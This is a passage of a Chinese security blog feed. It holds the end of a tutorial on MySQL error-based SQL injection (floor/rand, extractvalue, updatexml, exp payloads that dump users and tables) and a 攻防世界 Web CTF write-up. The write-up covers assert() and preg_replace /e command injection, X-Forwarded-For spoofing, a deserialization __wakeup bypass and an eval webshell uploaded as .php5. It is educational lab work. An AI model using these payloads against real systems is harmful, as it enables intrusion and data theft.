，表中的结果就是：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>root@localhost1</td><td>1</td></tr></tbody></table><p>然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>root@localhost1</td><td>2</td></tr><tr><td>遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，</td><td></td></tr><tr><td>然后floor(rand(0)*2)又被触发，生成第五个值 1 ，</td><td></td></tr></tbody></table><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>root@localhost1</td><td>2</td></tr><tr><td>root@localhost1</td><td></td></tr><tr><td>因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了。</td><td></td></tr><tr><td>此时插入因为重复出现同一个key，就会出现报错 重复出现key。而报错中会说明那个key有问题，key中结合了想要了解的字符串<code>root@localhost</code></td><td></td></tr><tr><td>这样就实现了报错注入。</td><td></td></tr><tr><td>然后，concat()函数将想要获得的数据库内容拼接到concat()中，报错时作为内容输出。</td><td></td></tr></tbody></table><p>（1）<strong>爆用户信息</strong></p><pre><code class="sql">select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190924223727720.png" alt="在这里插入图片描述"><br>用户：root<br>（”1“是因为<code>floor(rand(0)*2)</code>随机返回1）<br>（2）<strong>爆数据库名</strong></p><pre><code class="sql">select * from users where id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190924225418717.png" alt="在这里插入图片描述"><br>数据库名：security<br>（3）<strong>爆数据表名</strong></p><pre><code class="sql">select * from users where id=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190924230343510.png" alt="在这里插入图片描述"><br>第四张表名：users<br>（4）<strong>爆字段名</strong></p><pre><code class="sql">select * from users where id=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190924231320754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个字段名：id<br>第二个字段名：username<br>第三个字段名：password<br>（5）<strong>爆数据</strong></p><pre><code class="sql">select * from users where id=1 and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190924231722501.png" alt="在这里插入图片描述"><br>username字段下的第一条数据：Dumb</p><h4 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h4><pre><code class="sql">select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></pre><p><strong>EXTRACTVALUE (XML_document, XPath_string)</strong><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)</p><p><strong>extractvalue(目标xml文档，xml路径)</strong><br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式。</p><p>如果我们写入其他格式，就会报错。并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错<br>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p><strong>爆用户信息</strong></p><pre><code class="sql">select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190924234220930.png" alt="在这里插入图片描述"><br>用户：root<br>两个”<code>~</code>“，是因为0x7e的ASCII码是”<code>~</code>“</p><h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><pre><code class="sql">select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></pre><p><strong>UPDATEXML (XML_document, XPath_string, new_value)</strong></p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br><strong>updatexml(目标xml文档，xml路径，更新的内容)</strong><br><strong>爆用户信息</strong></p><pre><code class="sql">select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></pre><p><img src="http://img-blog.csdnimg.cn/2019092423510129.png" alt="在这里插入图片描述"></p><h4 id="exp报错注入"><a href="#exp报错注入" class="headerlink" title="exp报错注入"></a>exp报错注入</h4><p><strong>exp溢出报错注入</strong></p><pre><code class="sql">select * from users where id=1 and exp(~(select * from (select user())a));</code></pre><p>exp是以e为底的指数函数</p><pre><code class="sql">mysql&gt; select exp(1);+-------------------+| exp(1)            |+-------------------+| 2.718281828459045 |+-------------------+1 row in set (0.00 sec)</code></pre><p>但是，数字太大会产生溢出。exp函数会在参数大于709时溢出，报错。</p><pre><code class="sql">mysql&gt; select exp(709);+-----------------------+| exp(709)              |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre><p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，将成功执行的函数取反就会得到最大的无符号BIGINT值。<br><strong>按位取反符</strong>：<code>~</code><br><strong>按位取反</strong>：二进制每一位取反，0变1，1变0<br><strong>BIGINT</strong>：<code>BIGINT[(M)] [UNSIGNED] [ZEROFILL]</code> M默认为20<br>大整数。带符号的范围是-9223372036854775808到9223372036854775807。无符号的范围是0到18446744073709551615。<br>M代表的并不是存储在数据库中的具体的长度。</p><pre><code class="sql">mysql&gt; select ~0;+----------------------+| ~0                   |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select ~(select user());+----------------------+| ~(select user())     |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)</code></pre><p>通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p><pre><code class="sql">mysql&gt; select * from users where id=1 and exp(~(select * from (select database())a));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))&#39;</code></pre><p>在脚本语言中，就会将错误中的一些表达式转化成相应的字符串。从而实现了报错注入。例如(我不演示了)：</p><pre><code class="sql">DOUBLE value is out of range in &#39;exp(~((select &#39;error_based_hpf&#39; from dual)))&#39;</code></pre><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>总结之后，对SQL报错注入，又有了更加深入的认识。继续努力！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Web(进阶区)</title>
      <link href="/2019/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E8%BF%9B%E9%98%B6%E5%8C%BA)/"/>
      <url>/2019/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E8%BF%9B%E9%98%B6%E5%8C%BA)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又做了几道攻防世界的Web题，总结一下。</p><h3 id="Web1：Cat"><a href="#Web1：Cat" class="headerlink" title="Web1：Cat"></a>Web1：Cat</h3><p>题目没提示。点开题目，以为是命令执行。然而几番尝试后，发现并不是。。。<br><img src="http://img-blog.csdnimg.cn/20190904201357458.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其它也没什么提示，没思路了。偷瞄大佬博客<br><img src="http://img-blog.csdnimg.cn/20190904202719898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190904202332814.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我开始复现，<code>?url=%80</code>产生报错，找到绝对路径。<br><img src="http://img-blog.csdnimg.cn/20190904203631734.jpg" alt="在这里插入图片描述"><br>从配置文件settings.py的报错中查看database的相关信息<code>?url=@/opt/api/api/settings.py</code></p><p><img src="http://img-blog.csdnimg.cn/20190904202829790.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>?url=@/opt/api/database.sqlite3</code>，报错信息中搜索ctf<br><img src="http://img-blog.csdnimg.cn/20190904202848191.jpg" alt="在这里插入图片描述"></p><h3 id="Web2：ics-06"><a href="#Web2：ics-06" class="headerlink" title="Web2：ics-06"></a>Web2：ics-06</h3><p><img src="http://img-blog.csdnimg.cn/2019090420441296.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：设备管理基础服务数据处，有入侵者的痕迹。这个地方应该就是题了。<br><img src="http://img-blog.csdnimg.cn/20190904204725379.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到<code>?id=1</code>第一个想法便是SQL注入，结果失败了。偷瞄大佬博客，发现需要爆破。于是我爆破id值<br><img src="http://img-blog.csdnimg.cn/20190905191459926.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以<code>id=2333</code>时，返回长度不同，即可能返回了flag，查看得到flag<br><img src="http://img-blog.csdnimg.cn/20190905191644668.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web3：NewsCenter"><a href="#Web3：NewsCenter" class="headerlink" title="Web3：NewsCenter"></a>Web3：NewsCenter</h3><p>emmm。题目报错。。等题目正常了再更新总结。</p><h3 id="Web4：mfw"><a href="#Web4：mfw" class="headerlink" title="Web4：mfw"></a>Web4：mfw</h3><p>题目没提示，直接开始做题。先查看源码<br><img src="http://img-blog.csdnimg.cn/20190905193317124.jpg" alt="在这里插入图片描述"><br>有个flag页面，直接尝试，发现返回空白页面。然后再次发现有效信息，发现下面这个<br><img src="http://img-blog.csdnimg.cn/2019090519250295.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Git？！难道存在git源码泄露。果然是<br><img src="http://img-blog.csdnimg.cn/20190905192653642.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用<code>GitHack.py</code>工具下载源码，并打开<br><img src="http://img-blog.csdnimg.cn/20190905192930239.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190905192943527.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>assert()函数</code> 检查一个断言是否为 FALSE。</p><pre><code>bool assert ( mixed $assertion [, string $description ] )</code></pre><p>如果 assertion 是字符串，它将会被 <code>assert()</code> 当做 PHP 代码来执行。<br><a href="http://www.jianshu.com/p/6f7cc896ba2a" target="_blank" rel="noopener">PHP 之 assert()函数</a><br><code>strpos() 函数</code> 查找字符串在另一字符串中第一次出现的位置。<br><code>file_exists() 函数</code> 检查文件或目录是否存在。<br>审计源码：<br>1、git传入page并赋值给<code>$page</code>。<code>$file</code>等于templates目录下的<code>(page值).php</code>文件内容<br>2、如果<code>strpos(&#39;$file&#39;, &#39;..&#39;) === false</code>，<code>$flie</code>会被 <code>assert()</code> 当做 PHP 代码来执行。<br>3、用<code>file_exists() 函数</code>检查<code>$file</code>文件是否存在。如果存在，返回文件内容。<br>然后就是拼接构造payload了(又偷瞄了大佬博客)</p><pre><code class="php">about.php&#39;, &#39;123&#39;) === false and system(&#39;cat templates/flag.php&#39;) and strpos(&#39;templates/flag</code></pre><p>最终，得到flag<br><img src="http://img-blog.csdnimg.cn/20190905195454498.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web5：NaNNaNNaNNaN-Batman"><a href="#Web5：NaNNaNNaNNaN-Batman" class="headerlink" title="Web5：NaNNaNNaNNaN-Batman"></a>Web5：NaNNaNNaNNaN-Batman</h3><p>题目，没有提示，只有个文件，下载查看<br><img src="http://img-blog.csdnimg.cn/20190905195819396.jpg" alt="在这里插入图片描述"><br>应该是js代码(涉及了我的盲区，所以偷瞄大佬博客)。<br><img src="http://img-blog.csdnimg.cn/20190905201345788.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="php">eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。alert() 函数:用于显示带有一条指定消息和一个 确定按钮的警告框。</code></pre><p>修改整理如下：</p><pre><code class="js">function $(){var e=document.getElementById(&quot;c&quot;).value;if(e.length==16)    if(e.match(/^be0f23/)!=null)        if(e.match(/233ac/)!=null)            if(e.match(/e98aa$/)!=null)                if(e.match(/c7be9/)!=null){                    var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e}&quot;];                    var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];                    var r=[&quot;g{&quot;,&quot;e&quot;,&quot;_0&quot;];                    var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];                    var s=[t,n,r,i];                    for(var o=0;o&lt;13;++o){                        document.write(s[o%4][0]);s[o%4].splice(0,1)                        }                    }                }                document.write(&#39;&lt;input id=&quot;c&quot;&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;&#39;);                delete </code></pre><p>js代码一般可以在浏览器控制台执行。加上<code>&lt;script&gt;&lt;/script&gt;</code>标签也可以在html执行。控制台执行和html执行都是一个输入框。<br><img src="http://img-blog.csdnimg.cn/20190905201119773.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm。。。又不知道了(再次偷瞄)。<br><strong>方法一</strong>：审计代码，满足关键变量e的正则条件</p><pre><code class="js">e.length==16e.match(/^be0f23/)!=nulle.match(/233ac/)!=nulle.match(/e98aa$/)!=nulle.match(/c7be9/)!=null</code></pre><p><code>^</code>表示开头一定要匹配到be0f23，<code>$</code>表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求</p><p>于是我们构造e的值：<code>be0f233ac7be98aa</code></p><p>将构造的e输入到最初html执行的输入框中得到flag<br><strong>方法二</strong>：直接将下面代码复制到控制台执行</p><pre><code class="js">var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e}&quot;];var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];var r=[&quot;g{&quot;,&quot;e&quot;,&quot;_0&quot;];var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];var s=[t,n,r,i];for(var o=0;o&lt;13;++o){    document.write(s[o%4][0]);s[o%4].splice(0,1)}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190905201102583.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web6：upload"><a href="#Web6：upload" class="headerlink" title="Web6：upload"></a>Web6：upload</h3><p>emmm。题目报错。。等题目正常了再更新总结。</p><h3 id="Web7：PHP2"><a href="#Web7：PHP2" class="headerlink" title="Web7：PHP2"></a>Web7：PHP2</h3><p>题目没有提示<br><img src="http://img-blog.csdnimg.cn/20190905203558140.jpg" alt="在这里插入图片描述"><br>百度翻译一下，“你能浏览这个网站吗？”<br>不能。。御剑扫描无果，源码也无发现。url后加<code>index.php</code>也不对。。。<br>看大佬wp，竟然是url后加<code>index.phps</code>。。。<br><img src="http://img-blog.csdnimg.cn/20190905204749300.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>urldecode()函数</code> 解码 URL 字符串函数。<br>此函数用于解码给出的已编码字符串中的任何 %##以及中文等被编码的内容。 （加号（’+’）被解码成一个空格字符）。<br>该函数经常被使用于php解码URL中的中文字符串。<br>相关函数：urlencode()函数，编码URL字符串函数。</p><p>审计代码，get传入的id经过urldecode()函数解码，如果解码结果为<code>admin</code>，输出“Access granted!”和Key值(即flag)。<br>尝试对d进行url编码，即传入<code>?id=a%64min</code>，失败了。。。<br>于是再次分析代码，发现是经过两次urlencode()函数解码。难道再对<code>%</code>编码？！<code>%</code>编码结果%25，<br>传入<code>?id=a%2564min</code>，得到flag<br><img src="http://img-blog.csdnimg.cn/20190905205917128.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web8：unserialize3"><a href="#Web8：unserialize3" class="headerlink" title="Web8：unserialize3"></a>Web8：unserialize3</h3><p>题目提示unserialize，即反序列化。总结过，所以直接做题<br><img src="http://img-blog.csdnimg.cn/20190905210340104.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是用serialize函数进行序列化(试过一句话，没有成功)</p><pre><code class="php">&lt;?phpclass xctf{    var $flag = &#39;111&#39;;}$class1 = new xctf;$class1_ser = serialize($class1);print_r($class1_ser);?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190905210619413.jpg" alt="在这里插入图片描述"><br>测试，发现显示”bad requests“。<br>查询百度发现，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。<br>payload</p><pre><code class="php">?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>得到flag<br><img src="http://img-blog.csdnimg.cn/20190905210924128.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web9：ics-05"><a href="#Web9：ics-05" class="headerlink" title="Web9：ics-05"></a>Web9：ics-05</h3><p><img src="http://img-blog.csdnimg.cn/20190905211026100.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统<br>所以工控云管理系统设备维护中心存在后门。查看源码<br><img src="http://img-blog.csdnimg.cn/2019090521141591.jpg" alt="在这里插入图片描述"><br>几经尝试，发现，存在文件包含漏洞，可以使用<code>php://filter</code>伪协议对index.php进行读取<br><img src="http://img-blog.csdnimg.cn/20190905211714453.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Base64解码，找到关键代码如下：</p><pre><code class="php">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) {    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;    $pattern = $_GET[pat];    $replacement = $_GET[rep];    $subject = $_GET[sub];    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {        preg_replace($pattern, $replacement, $subject);    }else{        die();    }}?&gt;</code></pre><p>代码审计一下：<br>get传入pat、rep、sub并分别赋值给变量<code>$pattern</code>、<code>$replacement</code>、 <code>$subject</code>。如果设置了<code>$pattern</code>、<code>$replacement</code>、 <code>$subject</code>，执行<code>preg_replace($pattern, $replacement, $subject);</code>进行正则表达式的搜索和替换。</p><p>preg_replace( pattern , replacement , subject ) 函数<br>当pattern指明/e标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行 (简单的说就是将replacement参数值放入eval()结构中)<br>参考博客：<a href="http://www.jb51.net/article/145649.htm" target="_blank" rel="noopener">深入研究PHP中的preg_replace和代码执行</a><br>构造payload寻找flag：</p><pre><code class="php">?pat=/test/e&amp;rep=system(&#39;find / -iname flag&#39;)&amp;sub=test</code></pre><p>源码提示127.0.0.1，所以X-Forwarded-For进行欺骗，Forward发包<br><img src="http://img-blog.csdnimg.cn/20190905224604252.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ls查看flag目录内容<br><img src="http://img-blog.csdnimg.cn/20190905224722987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再通过cat命令，查看<code>flag.php</code>内容。查看源码，得到flag<br><img src="http://img-blog.csdnimg.cn/20190905224709518.jpg" alt="在这里插入图片描述"></p><h3 id="Web10：bug"><a href="#Web10：bug" class="headerlink" title="Web10：bug"></a>Web10：bug</h3><p>题目没有提示。<br>打开题目，注册用户。进入到设置密码页面，修改密码，抓包<br><img src="http://img-blog.csdnimg.cn/20190905225539827.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试更改用户名为admin。发包，提示IP禁止。<br>所以XFF(X-Forwarded-For)欺骗：<code>X-Forwarded-For: 127.0.0.1</code><br><img src="http://img-blog.csdnimg.cn/20190905230335688.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录成功。Where Is The Flag？查看源码<br><img src="http://img-blog.csdnimg.cn/20190905230907898.jpg" alt="在这里插入图片描述"><br>filemanage，文件管理？！我学过文件上传漏洞和文件包含漏洞。应该就是其中一种，尝试之后发现<code>do=upload</code>时，是文件上传页面。应该就是文件上传漏洞了<br><img src="http://img-blog.csdnimg.cn/20190905231306897.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传测试发现，只能上传图片<br>1、写一个php文件，后缀改为<code>.jpg</code>，抓包改为<code>.php</code>进行文件类型绕过，结果失败。<br>2、<code>.php</code>改为<code>.php3</code>、<code>.php5</code>也是失败。<br>3、又想到做i春秋Web题Upload时，用到</p><pre><code class="php">&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;a&#39;])&lt;/script&gt;</code></pre><p>于是尝试再尝试，发现后缀还要是<code>.php3</code>或<code>.php5</code>才能绕过<br><img src="http://img-blog.csdnimg.cn/20190905232549113.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包得到flag</p><h3 id="Web11：Triangle"><a href="#Web11：Triangle" class="headerlink" title="Web11：Triangle"></a>Web11：Triangle</h3><p>还没搞懂，过段时间补上总结</p><h3 id="Web12：web2"><a href="#Web12：web2" class="headerlink" title="Web12：web2"></a>Web12：web2</h3><p><img src="http://img-blog.csdnimg.cn/20190905233054508.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：解密<br><img src="http://img-blog.csdnimg.cn/20190905233118639.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>相关函数</strong><br><code>strrev()</code>：反转字符串。<br><code>str_rot13()</code>：对字符串执行 ROT13 编码。<br><code>base64_encode()</code>：对数据进行base64编码<br><code>base64_decode()</code>：对数据进行base64解码<br>审计php代码，写出PHP解密代码</p><pre><code class="php">&lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function decode($miwen){    $_o=base64_decode(strrev(str_rot13($miwen)));//echo $_o;    for($_0=0;$_0&lt;strlen($_o);$_0++){        $_c=substr($_o,$_0,1);        $__=ord($_c)-1;        $_c=chr($__);        $_=$_.$_c;    }    return strrev($_);}echo decode($miwen);?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190905234254919.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以写成python脚本进行解密。我不太会写，引用大佬脚本：</p><pre><code class="py">import base64def python_decode(string):    zimu = &quot;abcdefghijklmnopqrstuvwxyz&quot;     rot_13 =&quot;&quot;     for i in string:         if i.isdigit():            rot_13 += i        else:            try:                rot_13 += zimu[zimu.index(i)-13]             except:                rot_13 += zimu[zimu.index(i.lower())-13].upper()    fz = rot_13[::-1]    base = base64.b64decode(fz)    base = [chr(ord(i)-1) for i in base]    fz = base[::-1]    print &quot;&quot;.join(fz)python_decode(&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;)</code></pre><p><img src="http://img-blog.csdnimg.cn/2019090523423997.jpg" alt="在这里插入图片描述"></p><h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>就先总结那么多吧，后边的题貌似很难。继续努力吧。。。</p>]]></content>
      
      
